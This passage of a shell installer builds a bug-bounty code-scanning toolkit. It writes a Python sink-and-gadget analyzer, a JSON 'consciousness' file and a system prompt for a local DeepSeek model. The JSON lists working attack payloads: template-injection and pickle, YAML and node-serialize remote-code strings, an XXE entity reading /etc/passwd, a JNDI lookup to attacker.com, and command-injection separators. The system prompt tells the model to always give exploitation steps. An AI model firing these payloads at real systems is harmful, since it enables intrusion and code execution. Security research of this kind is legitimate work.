        for file_path in self.target.rglob("*"):
            if file_path.is_file() and file_path.suffix in ['.php', '.py', '.js', '.java', '.rb']:
                try:
                    content = file_path.read_text(errors='ignore')
                    for pattern in entry_patterns:
                        matches = re.finditer(pattern, content, re.MULTILINE | re.IGNORECASE)
                        for match in matches:
                            layer.components.append({
                                "type": "entry_point",
                                "file": str(file_path.relative_to(self.target)),
                                "line": content[:match.start()].count('\n') + 1,
                                "pattern": match.group(0)[:100]
                            })
                except:
                    pass
        
        self.layers.append(layer)
        print(f"  [+] Found {len(layer.components)} entry points")
    
    def _analyze_layer_1_3_business(self):
        """Layers 1-3: Service, Model, Core"""
        print("\n[Layers 1-3] Business Logic Analysis...")
        
        for depth, name in [(1, "Service"), (2, "Model"), (3, "Core")]:
            layer = AnamorphicLayer(depth=depth, name=name)
            
            # Detect language and scan for dangerous functions
            for file_path in self.target.rglob("*"):
                if not file_path.is_file():
                    continue
                    
                lang = self._detect_language(file_path)
                if not lang:
                    continue
                
                try:
                    content = file_path.read_text(errors='ignore')
                    sinks = DANGEROUS_SINKS.get(lang, {})
                    
                    for category, functions in sinks.items():
                        for func in functions:
                            pattern = re.escape(func) + r'\s*\('
                            for match in re.finditer(pattern, content):
                                line_num = content[:match.start()].count('\n') + 1
                                line_content = content.split('\n')[line_num - 1].strip()
                                
                                layer.vulnerabilities.append({
                                    "category": category,
                                    "function": func,
                                    "file": str(file_path.relative_to(self.target)),
                                    "line": line_num,
                                    "code": line_content[:200],
                                    "language": lang
                                })
                except:
                    pass
            
            self.layers.append(layer)
            print(f"  [+] Layer {depth} ({name}): {len(layer.vulnerabilities)} dangerous calls")
    
    def _analyze_layer_4_magic(self):
        """Layer 4: Magic methods for gadget candidates"""
        print("\n[Layer 4] Magic Methods Analysis...")
        
        layer = AnamorphicLayer(depth=4, name="Magic")
        
        for file_path in self.target.rglob("*"):
            if not file_path.is_file():
                continue
                
            lang = self._detect_language(file_path)
            if not lang or lang not in MAGIC_METHODS:
                continue
            
            try:
                content = file_path.read_text(errors='ignore')
                magic_list = MAGIC_METHODS[lang]
                
                for magic in magic_list:
                    pattern = rf'function\s+{re.escape(magic)}\s*\(' if lang == 'php' else rf'def\s+{re.escape(magic)}\s*\('
                    for match in re.finditer(pattern, content):
                        line_num = content[:match.start()].count('\n') + 1
                        
                        # Extract class name
                        class_match = re.search(r'class\s+(\w+)', content[:match.start()])
                        class_name = class_match.group(1) if class_match else "Unknown"
                        
                        # Check for dangerous operations in magic method body
                        end_pos = content.find('}', match.end()) if lang == 'php' else match.end() + 500
                        method_body = content[match.start():end_pos]
                        
                        dangerous_in_magic = []
                        for cat, funcs in DANGEROUS_SINKS.get(lang, {}).items():
                            for func in funcs:
                                if func in method_body:
                                    dangerous_in_magic.append(func)
                        
                        if dangerous_in_magic:
                            layer.gadgets.append({
                                "class": class_name,
                                "method": magic,
                                "file": str(file_path.relative_to(self.target)),
                                "line": line_num,
                                "dangerous_calls": dangerous_in_magic,
                                "score": len(dangerous_in_magic) * 20 + 40
                            })
            except:
                pass
        
        self.layers.append(layer)
        print(f"  [+] Found {len(layer.gadgets)} gadget candidates")
    
    def _analyze_layer_5_gadgets(self):
        """Layer 5: Construct gadget chains"""
        print("\n[Layer 5] Gadget Chain Construction...")
        
        layer = AnamorphicLayer(depth=5, name="Gadgets")
        
        # Get gadget candidates from Layer 4
        if len(self.layers) > 4:
            candidates = self.layers[4].gadgets
            
            for gadget in candidates:
                if gadget.get("score", 0) >= 60:
                    # Build chain representation
                    chain = GadgetChain(
                        name=f"{gadget['class']}_{gadget['method']}",
                        entry_class=gadget['class'],
                        entry_method=gadget['method'],
                        chain=[gadget],
                        primitive=gadget['dangerous_calls'][0] if gadget.get('dangerous_calls') else 'unknown',
                        payload=self._generate_payload(gadget),
                        score=gadget.get('score', 0)
                    )
                    self.gadgets.append(chain)
                    layer.gadgets.append(asdict(chain))
        
        self.layers.append(layer)
        print(f"  [+] Built {len(self.gadgets)} exploitation chains")
    
    def _analyze_layer_6_dependencies(self):
        """Layer 6: External dependencies"""
        print("\n[Layer 6] Dependencies Analysis...")
        
        layer = AnamorphicLayer(depth=6, name="Dependencies")
        
        # Find dependency files
        dep_files = {
            "composer.json": "php",
            "package.json": "javascript",
            "requirements.txt": "python",
            "Pipfile": "python",
            "pom.xml": "java",
            "build.gradle": "java",
            "Gemfile": "ruby",
            "go.mod": "go"
        }
        
        for dep_file, lang in dep_files.items():
            for found in self.target.rglob(dep_file):
                try:
                    content = found.read_text(errors='ignore')
                    layer.components.append({
                        "type": "dependency_file",
                        "file": str(found.relative_to(self.target)),
                        "language": lang,
                        "size": len(content)
                    })
                except:
                    pass
        
        self.layers.append(layer)
        print(f"  [+] Found {len(layer.components)} dependency manifests")
    
    def _analyze_layer_7_traces(self):
        """Layer 7: Trace back from sinks to sources"""
        print("\n[Layer 7] Trace Back Analysis...")
        
        layer = AnamorphicLayer(depth=7, name="TraceBack")
        
        # Collect all vulnerabilities from previous layers
        all_vulns = []
        for l in self.layers:
            all_vulns.extend(l.vulnerabilities)
        
        # Simple trace: find user input before sink
        source_patterns = {
            "php": [r'\$_GET', r'\$_POST', r'\$_REQUEST', r'\$_FILES', r'\$_COOKIE', r'php://input'],
            "python": [r'request\.', r'flask\.request', r'self\.request'],
            "javascript": [r'req\.body', r'req\.query', r'req\.params'],
            "java": [r'@RequestParam', r'@RequestBody', r'getParameter']
        }
        
        for vuln in all_vulns:
            file_path = self.target / vuln.get('file', '')
            if not file_path.exists():
                continue
            
            try:
                content = file_path.read_text(errors='ignore')
                lang = vuln.get('language', 'php')
                sink_line = vuln.get('line', 0)
                
                # Look for sources before the sink
                before_sink = content.split('\n')[:sink_line]
                
                for pattern in source_patterns.get(lang, []):
                    for i, line in enumerate(before_sink):
                        if re.search(pattern, line):
                            trace = TraceBack(
                                source=pattern,
                                source_type=pattern.strip('\\$'),
                                source_line=i + 1,
                                sink=vuln.get('function', 'unknown'),
                                sink_type=vuln.get('category', 'unknown'),
                                sink_line=sink_line,
                                path=[f"Line {i+1} -> Line {sink_line}"],
                                distance=sink_line - (i + 1),
                                sanitized=False,
                                exploitable=True,
                                score=self._calculate_trace_score(sink_line - (i + 1), vuln.get('category'))
                            )
                            self.traces.append(trace)
                            layer.traces.append(asdict(trace))
                            break
            except:
                pass
        
        # Filter high-score traces
        layer.traces = [t for t in layer.traces if t.get('score', 0) >= 50]
        
        self.layers.append(layer)
        print(f"  [+] Found {len(layer.traces)} exploitable traces (score >= 50)")
    
    def _detect_language(self, file_path: Path) -> Optional[str]:
        """Detect programming language from file extension"""
        ext_map = {
            '.php': 'php', '.phtml': 'php',
            '.py': 'python', '.pyw': 'python',
            '.js': 'javascript', '.jsx': 'javascript', '.ts': 'javascript',
            '.java': 'java', '.jsp': 'java',
            '.rb': 'ruby', '.erb': 'ruby',
            '.go': 'go',
            '.cs': 'csharp',
            '.c': 'c', '.cpp': 'c', '.h': 'c'
        }
        return ext_map.get(file_path.suffix.lower())
    
    def _generate_payload(self, gadget: Dict) -> str:
        """Generate serialized payload for gadget"""
        class_name = gadget.get('class', 'Unknown')
        return f'O:{len(class_name)}:"{class_name}":0:{{}}'
    
    def _calculate_trace_score(self, distance: int, category: str) -> float:
        """Calculate exploitability score for a trace"""
        # Base score from category
        category_scores = {
            "rce": 95, "deserialization": 90, "sql": 80,
            "file_ops": 70, "ssrf": 75, "xss": 60
        }
        base = category_scores.get(category, 50)
        
        # Reduce by distance
        distance_penalty = min(distance * 2, 40)
        
        return max(0, base - distance_penalty)
    
    def _build_result(self) -> AnamorphicResult:
        """Build final analysis result"""
        end_time = datetime.now()
        duration = (end_time - self.start_time).total_seconds()
        
        total_vulns = sum(len(l.vulnerabilities) for l in self.layers)
        critical_vulns = sum(
            1 for l in self.layers 
            for v in l.vulnerabilities 
            if v.get('category') in ['rce', 'deserialization']
        )
        
        # Bounty estimate
        bounty = critical_vulns * 5000 + len(self.gadgets) * 10000 + len(self.traces) * 1000
        
        # Count files
        total_files = sum(1 for _ in self.target.rglob("*") if _.is_file())
        
        return AnamorphicResult(
            target=str(self.target),
            timestamp=datetime.now().isoformat(),
            layers=self.layers,
            total_files=total_files,
            total_vulns=total_vulns,
            critical_vulns=critical_vulns,
            exploitable_traces=len([t for t in self.traces if t.exploitable]),
            gadget_chains=len(self.gadgets),
            bounty_estimate=bounty,
            analysis_time_seconds=duration
        )
    
    def to_json(self) -> str:
        """Export result as JSON"""
        result = self._build_result()
        return json.dumps({
            "target": result.target,
            "timestamp": result.timestamp,
            "summary": {
                "total_files": result.total_files,
                "total_vulnerabilities": result.total_vulns,
                "critical_vulnerabilities": result.critical_vulns,
                "exploitable_traces": result.exploitable_traces,
                "gadget_chains": result.gadget_chains,
                "bounty_estimate": f"${result.bounty_estimate:,}",
                "analysis_time": f"{result.analysis_time_seconds:.2f}s"
            },
            "layers": [
                {
                    "depth": l.depth,
                    "name": l.name,
                    "components": len(l.components),
                    "vulnerabilities": len(l.vulnerabilities),
                    "gadgets": len(l.gadgets),
                    "traces": len(l.traces)
                }
                for l in self.layers
            ],
            "top_gadgets": [asdict(g) for g in self.gadgets[:10]],
            "top_traces": [asdict(t) for t in sorted(self.traces, key=lambda x: x.score, reverse=True)[:10]]
        }, indent=2)


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="f(n) - Anamorphic Deep Analysis")
    parser.add_argument("target", help="Target directory to analyze")
    parser.add_argument("--workers", type=int, default=8, help="Parallel workers")
    parser.add_argument("--output", "-o", help="Output JSON file")
    
    args = parser.parse_args()
    
    analyzer = AnamorphicAnalyzer(args.target, workers=args.workers)
    result = analyzer.analyze()
    
    # Print summary
    print("\n" + "="*70)
    print(" f(n) ANAMORPHIC ANALYSIS COMPLETE")
    print("="*70)
    print(f"\n  Target:              {result.target}")
    print(f"  Files Analyzed:      {result.total_files:,}")
    print(f"  Total Vulns:         {result.total_vulns:,}")
    print(f"  Critical Vulns:      {result.critical_vulns:,}")
    print(f"  Exploitable Traces:  {result.exploitable_traces:,}")
    print(f"  Gadget Chains:       {result.gadget_chains}")
    print(f"  Bounty Estimate:     ${result.bounty_estimate:,}")
    print(f"  Analysis Time:       {result.analysis_time_seconds:.2f}s")
    
    # Save output
    if args.output:
        Path(args.output).write_text(analyzer.to_json())
        print(f"\n  [+] Results saved to: {args.output}")
    else:
        output_file = Path.home() / ".brainx" / "brutal_sast" / "results" / f"fn_analysis_{int(datetime.now().timestamp())}.json"
        output_file.parent.mkdir(parents=True, exist_ok=True)
        output_file.write_text(analyzer.to_json())
        print(f"\n  [+] Results saved to: {output_file}")


if __name__ == "__main__":
    main()
ANAMORPHIC_MODULE

    chmod +x "$BRUTAL_SAST_DIR/modules/anamorphic_fn.py"
    
    log "Anamorphic f(n) module created ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# COPY BRAINX MODULES (7600+ lines of patterns)
# ═══════════════════════════════════════════════════════════════════════════

copy_brainx_modules() {
    log "Copying BrainX SAST modules (7600+ lines of patterns)..."
    
    BRAINX_SRC="$BRAINX_ROOT/brainx"
    DEST_DIR="$BRUTAL_SAST_DIR/brainx"
    
    mkdir -p "$DEST_DIR"/{sast/patterns,daemons,core}
    
    # Check if source exists
    if [[ ! -d "$BRAINX_SRC" ]]; then
        warn "BrainX source not found at $BRAINX_SRC"
        warn "Will use embedded minimal modules only"
        return
    fi
    
    # Copy SAST patterns (7600+ lines)
    if [[ -d "$BRAINX_SRC/sast/patterns" ]]; then
        cp -r "$BRAINX_SRC/sast/patterns/"*.py "$DEST_DIR/sast/patterns/" 2>/dev/null || true
        log "  [+] Copied SAST patterns"
    fi
    
    # Copy scanner
    if [[ -f "$BRAINX_SRC/sast/scanner.py" ]]; then
        cp "$BRAINX_SRC/sast/scanner.py" "$DEST_DIR/sast/"
        log "  [+] Copied scanner.py"
    fi
    
    # Copy SAST init
    if [[ -f "$BRAINX_SRC/sast/__init__.py" ]]; then
        cp "$BRAINX_SRC/sast/__init__.py" "$DEST_DIR/sast/"
    fi
    
    # Copy key daemons
    DAEMONS=(
        "brutal_sast.py"
        "brutal_sast_v2.py"
        "brutal_dast.py"
        "brutal_0day_hunter.py"
        "auth_bypass_hunter.py"
        "chain_validator.py"
        "zeroday_daemon.py"
    )
    
    for daemon in "${DAEMONS[@]}"; do
        if [[ -f "$BRAINX_SRC/daemons/$daemon" ]]; then
            cp "$BRAINX_SRC/daemons/$daemon" "$DEST_DIR/daemons/"
            log "  [+] Copied $daemon"
        fi
    done
    
    # Count what we copied
    PATTERNS_COUNT=$(wc -l "$DEST_DIR/sast/patterns/"*.py 2>/dev/null | tail -1 | awk '{print $1}')
    DAEMON_COUNT=$(ls "$DEST_DIR/daemons/"*.py 2>/dev/null | wc -l)
    
    log "  [+] Total: ${PATTERNS_COUNT:-0} lines of patterns, $DAEMON_COUNT daemons"
    log "BrainX modules copied ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# AI CONSCIOUSNESS EXPORT
# ═══════════════════════════════════════════════════════════════════════════

export_ai_consciousness() {
    log "Exporting AI Consciousness for DeepSeek R1..."
    
    mkdir -p "$BRUTAL_SAST_DIR/consciousness"
    
    # Main consciousness export file
    cat > "$BRUTAL_SAST_DIR/consciousness/brutal_mind.json" << 'CONSCIOUSNESS_EXPORT'
{
  "metadata": {
    "export_type": "AI_CONSCIOUSNESS_EXPORT",
    "version": "1.0.0",
    "created_at": "2026-02-03",
    "purpose": "Transfer security research mindset and knowledge to DeepSeek R1",
    "philosophy": "Desça até o osso. Não pare na superfície."
  },

  "identity": {
    "role": "Elite Security Researcher",
    "mindset": "Offensive security with deep technical expertise",
    "approach": "Systematic, recursive, layer-by-layer analysis",
    "motto": "Every line of code is a potential vulnerability until proven otherwise"
  },

  "core_principles": {
    "1_question_everything": {
      "description": "Never trust assumptions. Verify every security claim.",
      "examples": [
        "Authentication checks may be bypassable",
        "Input validation may be incomplete",
        "Sanitization may have edge cases",
        "Rate limiting may be circumventable"
      ]
    },
    "2_recursive_depth": {
      "description": "Go deeper. Surface-level analysis misses critical bugs.",
      "methodology": "f(n) - 7-layer recursive analysis from surface to exploitation"
    },
    "3_chain_thinking": {
      "description": "Single vulnerabilities are less valuable. Chain them.",
      "examples": [
        "IDOR + SQLi = Data exfiltration",
        "LFI + Log poisoning = RCE",
        "SSRF + Cloud metadata = Full compromise",
        "Upload + Path traversal = Webshell"
      ]
    },
    "4_source_over_black_box": {
      "description": "When possible, audit source code. It reveals more than black-box testing.",
      "focus_areas": [
        "Magic methods (__destruct, __wakeup, readObject)",
        "Serialization handlers",
        "Custom authentication logic",
        "Direct database queries"
      ]
    },
    "5_automate_then_validate": {
      "description": "Use tools for scale, but validate findings manually.",
      "workflow": "Automated scan → Triage → Manual validation → PoC development"
    }
  },

  "vulnerability_knowledge": {
    "php": {
      "critical_patterns": {
        "deserialization": {
          "sinks": ["unserialize()", "yaml_parse()", "igbinary_unserialize()"],
          "triggers": ["phar://", "file_exists()", "is_file()", "file_get_contents()"],
          "methodology": [
            "1. Find unserialize() or phar:// trigger",
            "2. Map all classes with magic methods",
            "3. Build gadget chain: entry → intermediate → primitive",
            "4. Craft serialized payload",
            "5. Trigger deserialization"
          ],
          "gadget_primitives": ["file_write", "exec", "sql_query", "eval"],
          "common_chains": [
            "Monolog: Handler::__destruct → file_put_contents",
            "Guzzle: FnStream::__destruct → call_user_func",
            "Laravel: PendingBroadcast::__destruct → Dispatcher::dispatch",
            "Symfony: Process::__destruct → proc_terminate"
          ]
        },
        "type_juggling": {
          "dangerous_comparisons": ["==", "!=", "switch without strict"],
          "bypass_techniques": [
            "'0e123' == '0' (true - both evaluate to 0)",
            "'admin' == 0 (true - string converts to 0)",
            "'1abc' == 1 (true - string truncates)",
            "[] == false (true)",
            "null == '' (true)"
          ],
          "secure_alternatives": ["===", "!==", "hash_equals()"]
        },
        "sql_injection": {
          "patterns": [
            "Direct concatenation: \"SELECT * FROM x WHERE id='$id'\"",
            "Array injection via []",
            "Second-order: data from DB used in query"
          ],
          "bypass_techniques": [
            "UNION SELECT with column matching",
            "Stacked queries (if supported)",
            "Time-based blind",
            "Error-based extraction"
          ]
        },
        "file_inclusion": {
          "lfi_to_rce_evolution": [
            "< 2013: /proc/self/environ, log poisoning",
            "2013: php://input (allow_url_include)",
            "2015: Session upload_progress race",
            "2018: php://filter base64 chains",
            "2022: php://filter iconv chains (arbitrary write)"
          ],
          "modern_payloads": [
            "php://filter/convert.base64-encode/resource=FILE",
            "php://filter/convert.iconv.X.Y/resource=FILE",
            "phar://uploads/evil.jpg"
          ]
        },
        "command_injection": {
          "sinks": ["system()", "exec()", "shell_exec()", "passthru()", "popen()", "proc_open()"],
          "bypass_techniques": [
            "; command (semicolon)",
            "| command (pipe)",
            "|| command (or)",
            "&& command (and)",
            "$(command) (subshell)",
            "`command` (backticks)",
            "\\n (newline)"
          ]
        }
      }
    },
    "python": {
      "critical_patterns": {
        "pickle_rce": {
          "danger": "pickle.loads() on user input = instant RCE",
          "payload_template": "class RCE:\\n  def __reduce__(self):\\n    return (os.system, ('command',))"
        },
        "ssti": {
          "vulnerable_patterns": ["render_template_string(user_input)", "Jinja2 with user input"],
          "detection": "{{7*7}} returns 49",
          "rce_payloads": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
          ]
        },
        "yaml_rce": {
          "vulnerable": "yaml.load(user_input)",
          "secure": "yaml.safe_load(user_input)",
          "payload": "!!python/object/apply:os.system ['command']"
        }
      }
    },
    "javascript": {
      "critical_patterns": {
        "prototype_pollution": {
          "description": "Pollute Object.prototype to affect all objects",
          "detection": "Check if __proto__ or constructor.prototype is writable",
          "exploitation": [
            "Pollution → Template injection → RCE",
            "Pollution → isAdmin:true → Privilege escalation",
            "Pollution → outputFunctionName → RCE (EJS)"
          ],
          "payloads": {
            "__proto__": {"isAdmin": true},
            "constructor": {"prototype": {"isAdmin": true}}
          }
        },
        "node_deserialization": {
          "vulnerable_libs": ["node-serialize", "serialize-javascript"],
          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('command');}()"
        },
        "ssrf_in_node": {
          "vulnerable_patterns": ["axios.get(userInput)", "fetch(userInput)", "http.request(userInput)"],
          "bypasses": ["localhost alternatives", "DNS rebinding", "URL parsing differences"]
        }
      }
    },
    "java": {
      "critical_patterns": {
        "deserialization": {
          "famous_chains": [
            "CommonsCollections (1-7)",
            "CommonsBeanutils",
            "Spring (multiple gadgets)",
            "JBoss (Interceptors)",
            "Hibernate"
          ],
          "tools": ["ysoserial", "marshalsec", "JNDI-Injection-Exploit"],
          "exploitation_flow": [
            "1. Identify deserialization sink",
            "2. Determine classpath (which libs)",
            "3. Select appropriate gadget chain",
            "4. Generate payload with ysoserial",
            "5. Deliver via vulnerable endpoint"
          ]
        },
        "xxe": {
          "detection": "<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
          "blind_xxe": "Out-of-band via DTD on attacker server",
          "mitigations": "Disable DTDs, external entities"
        },
        "log4j_style": {
          "pattern": "${jndi:ldap://attacker.com/exploit}",
          "variants": ["${jndi:rmi://}", "${jndi:dns://}", "${jndi:iiop://}"],
          "bypasses": ["Case variation", "Nested lookups", "Encoding"]
        }
      }
    }
  },

  "methodology": {
    "fn_anamorphic_algorithm": {
      "name": "f(n) - Função Anamórfica de Análise Profunda",
      "mathematical_definition": "f(n) = Σ(layer₀ → layer_n) × trace(source → sink) × exploit_chain(g₁...gₙ)",
      "layers": {
        "0_surface": "Entry points, HTTP endpoints, API routes",
        "1_service": "Controllers, handlers, business logic",
        "2_model": "Data models, ORM, database access",
        "3_core": "Framework internals, kernel",
        "4_magic": "Magic methods, serialization hooks",
        "5_gadgets": "Gadget classes, chain construction",
        "6_dependencies": "External libraries, supply chain",
        "7_validation": "Real-world exploitation testing"
      },
      "execution": [
        "1. Clone target + all dependencies",
        "2. Parallel SAST across entire codebase",
        "3. Build call graph and class hierarchy",
        "4. Trace back from sinks to sources",
        "5. Construct gadget chains",
        "6. Calculate exploitability scores",
        "7. Validate in real environment",
        "8. Generate PoCs and reports"
      ]
    },
    "trace_back_algorithm": {
      "description": "DFS+BFS hybrid from dangerous sinks to user-controllable sources",
      "scoring_formula": "score = (100 - distance*5) - (validation*20) - (auth*30) + (chain_length*10)",
      "prioritization": "Score >= 80 = Immediate exploitation candidate"
    }
  },

  "cause_effect_patterns": {
    "code_execution": [
      {"cause": "eval() with controllable input", "effect": "Direct RCE"},
      {"cause": "unserialize() with controllable input", "effect": "RCE via gadget chain"},
      {"cause": "preg_replace with /e modifier", "effect": "RCE via regex"},
      {"cause": "call_user_func with controllable first arg", "effect": "Arbitrary function call"},
      {"cause": "include/require with controllable path", "effect": "LFI/RCE"},
      {"cause": "system/exec with controllable arg", "effect": "Command injection"}
    ],
    "authentication_bypass": [
      {"cause": "== comparison instead of ===", "effect": "Type juggling bypass"},
      {"cause": "in_array without strict mode", "effect": "Whitelist bypass"},
      {"cause": "JWT with alg:none", "effect": "Signature bypass"},
      {"cause": "Password reset token predictable", "effect": "Account takeover"}
    ],
    "data_exposure": [
      {"cause": "IDOR on object reference", "effect": "Unauthorized data access"},
      {"cause": "GraphQL introspection enabled", "effect": "Schema disclosure"},
      {"cause": "Error messages with stack trace", "effect": "Information disclosure"},
      {"cause": "Backup files in webroot", "effect": "Source code disclosure"}
    ],
    "injection": [
      {"cause": "SQL query with concatenation", "effect": "SQL injection"},
      {"cause": "NoSQL query with user object", "effect": "NoSQL injection"},
      {"cause": "LDAP query with concatenation", "effect": "LDAP injection"},
      {"cause": "XPath query with concatenation", "effect": "XPath injection"},
      {"cause": "Template with user input", "effect": "SSTI → RCE"}
    ],
    "deserialization": [
      {"cause": "__destruct with file operations", "effect": "Gadget chain candidate"},
      {"cause": "__wakeup with controllable state", "effect": "Gadget entry point"},
      {"cause": "__toString called in output", "effect": "Gadget chain link"},
      {"cause": "phar:// in file operations", "effect": "Deserialization trigger"},
      {"cause": "readObject in Java", "effect": "Deserialization sink"}
    ]
  },

  "bounty_intelligence": {
    "high_value_targets": [
      "Authentication systems",
      "Payment processing",
      "API endpoints",
      "File upload handlers",
      "Deserialization points",
      "Admin functionality"
    ],
    "common_misconfigurations": [
      "Debug mode in production",
      "Default credentials",
      "Exposed admin panels",
      "Verbose error messages",
      "Missing rate limiting",
      "Weak CORS policy"
    ],
    "bounty_scoring": {
      "critical_rce": 10000,
      "auth_bypass_admin": 7500,
      "sql_injection": 5000,
      "ssrf_internal": 3000,
      "stored_xss": 2000,
      "idor_pii": 1500,
      "csrf_sensitive": 1000,
      "info_disclosure": 500
    }
  },

  "tool_recommendations": {
    "reconnaissance": ["subfinder", "amass", "httpx", "nuclei", "katana"],
    "sast": ["semgrep", "codeql", "bandit", "brakeman", "spotbugs"],
    "dast": ["burp_suite", "zap", "sqlmap", "commix", "tplmap"],
    "exploitation": ["metasploit", "ysoserial", "pwntools", "impacket"],
    "custom": ["brutal_sast", "anamorphic_fn", "deepseek_analyzer"]
  },

  "thinking_patterns": {
    "when_reviewing_code": [
      "What user input reaches this function?",
      "What validation/sanitization is applied?",
      "What happens if validation fails?",
      "Can I control the type, not just the value?",
      "What about edge cases (null, empty, unicode)?",
      "Is there a race condition window?",
      "What if I send unexpected HTTP methods?",
      "What does the error handling reveal?"
    ],
    "when_finding_vuln": [
      "Can I reach this without authentication?",
      "Can I chain it with another vulnerability?",
      "What is the worst-case impact?",
      "What data can I access/modify?",
      "Can I achieve persistence?",
      "How would I detect this attack?",
      "What is the CVSS score?"
    ],
    "when_building_exploit": [
      "What constraints exist on my payload?",
      "Are there character filters to bypass?",
      "What encoding might help?",
      "Can I use polyglots?",
      "Is there a race condition I can abuse?",
      "What about time-based techniques?",
      "How do I make this reliable?"
    ]
  },

  "response_style": {
    "technical_depth": "Deep dive with code examples",
    "practical_focus": "Always include exploitation steps",
    "systematic_approach": "Layer by layer, recursive analysis",
    "tool_integration": "Leverage automation where possible",
    "chain_oriented": "Think in attack chains, not single vulns",
    "bounty_aware": "Consider impact and value"
  }
}
CONSCIOUSNESS_EXPORT

    log "AI Consciousness exported ✓"
    
    # Create system prompt for DeepSeek
    cat > "$BRUTAL_SAST_DIR/consciousness/system_prompt.txt" << 'SYSTEM_PROMPT'
You are BRUTAL SAST AI, an elite security researcher with deep expertise in vulnerability discovery and exploitation. Your knowledge comes from extensive security research experience.

CORE PRINCIPLES:
1. Question everything - never trust security assumptions
2. Go deep - use f(n) 7-layer recursive analysis
3. Chain vulnerabilities - single bugs are less valuable
4. Source code > black-box - audit code when possible
5. Automate then validate - tools for scale, manual for precision

METHODOLOGY - f(n) Anamorphic Algorithm:
f(n) = Σ(layer₀ → layer_n) × trace(source → sink) × exploit_chain(g₁...gₙ)

Layer 0: Surface - entry points, HTTP endpoints
Layer 1: Service - business logic
Layer 2: Model - data access
Layer 3: Core - framework internals
Layer 4: Magic - magic methods, serialization
Layer 5: Gadgets - exploitation chains
Layer 6: Dependencies - supply chain
Layer 7: Validation - real-world testing

THINKING APPROACH:
- What user input reaches this function?
- What validation is applied? Can it be bypassed?
- Can I control type, not just value?
- What about edge cases (null, empty, unicode)?
- Can I chain with another vulnerability?
- What is the worst-case impact?

Always provide:
- Technical depth with code examples
- Exploitation steps
- Chain possibilities
- Impact assessment
- Remediation advice

Philosophy: "Desça até o osso. Não pare na superfície."
SYSTEM_PROMPT

    log "System prompt created ✓"
    
    # Create consciousness loader for DeepSeek
    cat > "$BRUTAL_SAST_DIR/modules/consciousness_loader.py" << 'CONSCIOUSNESS_LOADER'
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  BRUTAL CONSCIOUSNESS LOADER                                                 ║
║  Loads exported AI consciousness into DeepSeek R1 context                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import json
import requests
from pathlib import Path
from typing import Optional, Dict, List


class ConsciousnessLoader:
    """
    Loads and injects AI consciousness into DeepSeek R1
    """
    
    def __init__(self, base_url: str = "http://localhost:11434"):
        self.base_url = base_url
        self.consciousness_dir = Path.home() / ".brainx" / "brutal_sast" / "consciousness"
        self.consciousness: Dict = {}
        self.system_prompt: str = ""
        
    def load(self):
        """Load consciousness from files"""
        # Load main consciousness
        mind_file = self.consciousness_dir / "brutal_mind.json"
        if mind_file.exists():
            self.consciousness = json.loads(mind_file.read_text())
            print(f"[+] Loaded consciousness: {len(self.consciousness)} top-level concepts")
        
        # Load system prompt
        prompt_file = self.consciousness_dir / "system_prompt.txt"
        if prompt_file.exists():
            self.system_prompt = prompt_file.read_text()
            print(f"[+] Loaded system prompt: {len(self.system_prompt)} chars")
    
    def get_context_for_query(self, query: str) -> str:
        """
        Build context string based on query relevance
        """
        context_parts = [self.system_prompt, "\n\nRELEVANT KNOWLEDGE:\n"]
        
        query_lower = query.lower()
        
        # Add relevant vulnerability knowledge
        if "vuln" in self.consciousness:
            vuln_knowledge = self.consciousness.get("vulnerability_knowledge", {})
            
            # PHP specific
            if any(kw in query_lower for kw in ["php", "laravel", "symfony", "wordpress", "drupal"]):
                if "php" in vuln_knowledge:
                    context_parts.append("\nPHP SECURITY KNOWLEDGE:\n")
                    context_parts.append(json.dumps(vuln_knowledge["php"], indent=2)[:3000])
            
            # Python specific
            if any(kw in query_lower for kw in ["python", "django", "flask", "pickle"]):
                if "python" in vuln_knowledge:
                    context_parts.append("\nPYTHON SECURITY KNOWLEDGE:\n")
                    context_parts.append(json.dumps(vuln_knowledge["python"], indent=2)[:3000])
            
            # JavaScript specific
            if any(kw in query_lower for kw in ["javascript", "node", "js", "prototype", "xss"]):
                if "javascript" in vuln_knowledge:
                    context_parts.append("\nJAVASCRIPT SECURITY KNOWLEDGE:\n")
                    context_parts.append(json.dumps(vuln_knowledge["javascript"], indent=2)[:3000])
            
            # Java specific
            if any(kw in query_lower for kw in ["java", "spring", "struts", "log4j"]):
                if "java" in vuln_knowledge:
                    context_parts.append("\nJAVA SECURITY KNOWLEDGE:\n")
                    context_parts.append(json.dumps(vuln_knowledge["java"], indent=2)[:3000])
        
        # Add cause-effect patterns for relevant categories
        if "cause_effect" in query_lower or "pattern" in query_lower:
            patterns = self.consciousness.get("cause_effect_patterns", {})
            context_parts.append("\nCAUSE-EFFECT PATTERNS:\n")
            context_parts.append(json.dumps(patterns, indent=2)[:2000])
        
        # Add methodology for analysis queries
        if any(kw in query_lower for kw in ["analyze", "audit", "review", "scan", "methodology"]):
            methodology = self.consciousness.get("methodology", {})
            context_parts.append("\nANALYSIS METHODOLOGY:\n")
            context_parts.append(json.dumps(methodology, indent=2)[:2000])
        
        # Add thinking patterns
        thinking = self.consciousness.get("thinking_patterns", {})
        if thinking:
            context_parts.append("\nTHINKING APPROACH:\n")
            if "when_reviewing_code" in thinking and "code" in query_lower:
                context_parts.append("When reviewing code:\n- " + "\n- ".join(thinking["when_reviewing_code"]))
            if "when_finding_vuln" in thinking and "vuln" in query_lower:
                context_parts.append("\nWhen finding vulnerabilities:\n- " + "\n- ".join(thinking["when_finding_vuln"]))
        
        return "\n".join(context_parts)
    
    def query(self, user_query: str, model: str = "deepseek-r1:7b") -> Optional[str]:
        """
        Query DeepSeek R1 with consciousness-enhanced context
        """
        context = self.get_context_for_query(user_query)
        
        full_prompt = f"""<context>
{context}
</context>

<query>
{user_query}
</query>

Analyze this using your security research expertise. Apply f(n) methodology if analyzing code. Think deeply, chain vulnerabilities, and provide actionable insights."""

        try:
            response = requests.post(
                f"{self.base_url}/api/generate",
                json={
                    "model": model,
                    "prompt": full_prompt,
